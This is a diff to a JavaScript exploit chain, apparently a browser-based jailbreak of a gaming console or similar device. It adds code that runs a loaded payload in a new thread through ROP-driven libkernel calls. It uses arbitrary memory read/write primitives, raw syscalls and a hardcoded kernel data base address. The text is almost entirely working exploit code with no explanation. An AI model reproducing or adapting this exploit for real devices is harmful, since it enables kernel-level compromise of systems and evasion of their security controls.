@@ -886,7 +886,7 @@ function stage3() {
 	//alert ("listen: 0x" + listen);
 		
 	let accepted = chain.syscall(0x1E, dump_sock_fd, 0, 0);
-	alert("accepted: 0x" + accepted);
+	//alert("accepted: 0x" + accepted);
 	
   
     // Create pipe pair and ultimate r/w prims
@@ -1528,6 +1528,29 @@ function stage3() {
 	let clsd = chain.syscall(6, dump_sock_fd);
 	let clsd2 = chain.syscall(6, accepted);
 	
+	let test_payload_store = p.malloc(0x8);
+	let args = p.malloc(0x8 * 6);
+	
+	let kdata_base = new int64(0x81726600, 0xffffffff);
+
+	// Arguments to entrypoint
+	/*
+	p.write8(args.add32(0x00), syscalls[0x24F]);         // arg1 = dlsym_t* dlsym
+	p.write8(args.add32(0x08), 0);           // arg2 = int *rwpipe[2]
+	p.write8(args.add32(0x10), 0);         // arg3 = int *rwpair[2]
+	p.write8(args.add32(0x18), 0);          // arg4 = uint64_t kpipe_addr
+	p.write8(args.add32(0x20), kdata_base);         // arg5 = uint64_t kdata_base_addr
+	p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout
+	*/
+	/*let result = chain.call(payload_buffer, libKernelBase.add32(0x1D3D0));
+	alert("result: 0x" + result);
+	errno = p.read8(libKernelBase.add32(OFFSET_ERRNO));
+	alert("errno: 0x" + errno);
+	*/
+	let pthread_handle_store = p.malloc(0x8);
+	let pthread_value_store = p.malloc(0x8);
+	chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, payload_buffer, libKernelBase.add32(0x1D3D0), p.stringify("payload"));
+	chain.call(libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
 }
 
 const stack_sz = 0x40000;
